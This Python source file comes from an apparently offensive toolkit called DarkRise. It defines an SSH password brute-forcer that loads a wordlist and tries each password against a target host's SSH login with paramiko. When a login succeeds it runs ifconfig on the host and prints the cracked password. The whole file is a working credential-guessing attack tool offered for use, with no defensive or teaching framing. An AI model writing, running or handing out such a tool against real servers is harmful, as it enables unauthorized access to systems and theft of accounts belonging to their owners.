from core.DarkRiseSettings import DarkRiseSettings
from termcolor import colored
import paramiko
import subprocess

class SSH_Breaker(DarkRiseSettings):
    def __init__(self, username, ipaddr, port, wordlist):
        super().__init__()
        self.username = username
        self.ip = ipaddr
        self.port = port
        self.wordlist = wordlist
        
        # SSH Client Setup
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def Break(self):
        _passwords = []
        try:
            with open(str(self.wordlist), 'r', encoding = 'utf-8') as wordlist:
                _passwords = [_pass.strip() for _pass in wordlist]

        except Exception:
            print("Please Check Out Your Wordlist!")

        subprocess.call("clear")
        self.logo()

        for sshpass in _passwords:
            if self.port is None:
                self.port = 22

            print(f"{self.username}@{self.ip} {self.port} : {sshpass}")
            try:
                # try to connect to host
                self.ssh.connect(self.ip, port = self.port, username = self.username, password = sshpass, timeout = 10)

                # if we're here it means the creditentials were correct.
                stdin, stdout, stderr = self.ssh.exec_command("/sbin/ifconfig")

                if b"inet" in stdout.read():
                    print(colored(f"Found Password: {sshpass}", "green", attrs=["bold"]))

                break

            except Exception as e:
                print(e)
                self.ssh.close()

            except KeyboardInterrupt:
                break

        self.ssh.close()